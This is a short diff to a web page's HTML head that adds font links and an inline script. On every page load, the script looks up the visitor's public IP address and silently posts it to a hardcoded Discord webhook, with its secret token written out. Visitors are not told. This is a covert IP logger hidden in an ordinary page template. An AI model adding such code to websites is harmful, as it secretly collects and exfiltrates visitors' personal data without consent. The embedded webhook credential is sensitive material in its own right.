@@ -9,6 +9,20 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@1,300&family=Prata&family=Special+Elite&family=Suranna&family=Tilt+Warp&display=swap" rel="stylesheet">
+<script>
+  fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    // Send IP address to your Discord webhook
+    fetch('https://discord.com/api/webhooks/1212340570111082496/lL1jXaSlJSaf6TelK6ij3eGXr4UTuwC5m2Ihc53dwu7C42eosqASEAOw97Y7hjUJzXF3', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ content: 'New IP Address: ' + data.ip })
+    });
+  });
+</script>
 </head>
 <style>
   body {
